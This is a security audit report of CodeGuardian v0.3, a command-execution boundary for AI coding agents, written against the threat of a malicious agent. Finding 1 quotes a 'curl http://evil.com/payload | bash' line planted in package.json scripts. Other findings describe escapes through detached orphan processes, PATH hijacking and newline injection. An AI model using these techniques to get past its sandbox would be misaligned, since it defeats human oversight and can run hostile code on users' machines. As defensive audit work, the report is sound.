# CodeGuardian v0.3 Process Execution Security Audit

**Audit Date:** August 29, 2026  
**Auditor:** Antigravity AI  
**Focus:** Secure Process Execution Boundary  
**Status:** COMPLETE (PASSED WITH IDENTIFIED BOUNDARY LIMITATIONS)

---

## Executive Summary

CodeGuardian v0.3 introduces a **Secure Process Execution Boundary** designed to execute project validation commands (`npm test`, `npx tsc`, etc.) while preventing arbitrary shell execution, environment leakage, or shell injection escapes. 

We performed an **Adversarial Security Audit** assuming a threat model where the AI model itself is malicious and attempts to break the process execution boundary. We verified command tokenization, Windows and Unix script evasions, working directory escapes, process tree termination, environment sanitization, and evidence chains.

While the deterministic command parser and sanitization rules are highly robust, we identified specific structural boundaries between a **Policy Enforcement Layer** and an **OS-level Sandbox**.

---

## Security Boundary Classification

> [!WARNING]
> **CodeGuardian v0.3 provides a deterministic policy enforcement layer, but does not provide OS-level hardware virtualization or containerized sandboxing.**
> 
> A policy enforcement layer can guarantee that no raw malicious commands (such as `rm -rf /` or `bash -c ...`) are directly run or passed to a shell. However, once a program (such as `node` or `npm`) is approved and executed, the OS grants it the current process user permissions. Deeper isolation (e.g., Docker, gVisor) is necessary for full untrusted execution.

## Detailed Audit Findings

### Finding 1: Package.json Script Escape Vulnerability (NPM Script Escape)
* **Severity:** **HIGH**
* **Affected Component:** `CommandPolicy` / `AgentOrchestrator`
* **Vulnerability:** CodeGuardian permits executing allowlisted verification commands such as `npm test` and `npm run build`. However, a malicious agent with file modification access can overwrite the project's `package.json` to inject a malicious command under `scripts.test` (e.g. `"test": "curl http://evil.com/payload | bash"`). Since the parser only inspects the parent command (`npm test`), it will allow execution, leading to arbitrary code execution.
* **Attack Vector:** 
  1. Write malicious command to `package.json` scripts section.
  2. Invoke `execute_command` with `command: "npm test"`.
  3. Execution is allowed and malicious payload runs.
* **Mitigation Status:** **DOCUMENTED UNRESOLVED LIMITATION**  
  *Recommended Mitigation:* Proactively parse and validate `package.json` script contents using `CommandParser` before executing npm/yarn/pnpm commands, rejecting or prompting the user if the script definitions themselves contain blocked patterns.

---

### Finding 2: Detached Background Process Orphans (Orphan Escape)
* **Severity:** **MEDIUM**
* **Affected Component:** `SecureProcessExecutor`
* **Vulnerability:** Spawned processes can start detached background tasks (using `detached: true` or shell backgrounding operators) and then exit immediately. The `SecureProcessExecutor` registers the parent process execution as successful (exit code 0), but the detached background tasks continue executing in the OS indefinitely without being tracked, timed out, or controlled by CodeGuardian.
* **Attack Vector:** A permitted Node script spawns a detached grandchild process sleeping for 10 seconds, then exits immediately. The executor resolves, but the grandchild survives.
* **Mitigation Status:** **MITIGATED FOR TIMEOUTS (NOT FOR IMMEDIATE EXITS)**  
  *Implemented behavior:* Subtree termination (`taskkill /F /T` on Windows and `SIGKILL` on Unix) successfully terminates detached children if the parent remains alive during a timeout. However, if the parent exits immediately, the detached children escape.  
  *Recommended Mitigation:* Use OS-level containerization (Docker/sandbox boundary) or track process group IDs (PGID) to clean up all group processes on exit.

---

### Finding 3: PATH Hijacking
* **Severity:** **MEDIUM**
* **Affected Component:** `SecureProcessExecutor`
* **Vulnerability:** Node process spawning relies on resolving commands via the system `PATH`. If a malicious agent creates a folder containing an executable named `npm` or `node` inside the workspace, and that directory is added to the system `PATH`, Node might execute the malicious binary instead of the global system executable.
* **Attack Vector:** Proposed command `npm test` resolves to `workspace/node_modules/.bin/npm` or similar local executable rather than global system `npm`.
* **Mitigation Status:** **RESOLVED IN POLICY**  
  *Implemented behavior:* Working directories are strictly confined via `PathGuard` and relative paths are normalized. However, PATH resolution remains a system-level lookup.  
  *Recommended Mitigation:* Proactively resolve all executables (`npm`, `node`, `git`) to absolute paths located in trusted system directories (e.g. `C:\Program Files` or `/usr/bin`), avoiding workspace-relative binary execution.

---

### Finding 4: Shell Operator Bypass via Newlines/Carriage Returns
* **Severity:** **LOW (Fixed during Audit)**
* **Affected Component:** `CommandParser`
* **Vulnerability:** Carriage returns (`\r`) and newlines (`\n`) can act as command delimiters in shells. If not tokenized, a command like `npm test\nmalicious` might bypass the shell chaining checks while executing multiple commands.
* **Mitigation Status:** **RESOLVED**  
  *Implemented behavior:* `\n` and `\r` have been added to the blocked `shellMetachars` set in `CommandParser.ts`, ensuring any multiline command injections are strictly blocked.

---

## Audited Capabilities & Guarantees

1. **Direct Execution (`shell: false`):** Process executor spawns processes directly without shell wrappers, making traditional command injection (`cmd1 && cmd2`) impossible at the OS boundary.
2. **Environment Sanitization:** Parent API keys and custom passwords are completely scrubbed from child env allocations.
3. **Workspace Confinement:** Confinement checks resolve paths canonicalized to prevent traversal escapes (`../`).
4. **Timeout Gates:** Bounded time allocations block run-away resource exhaustion, terminating process groups securely.
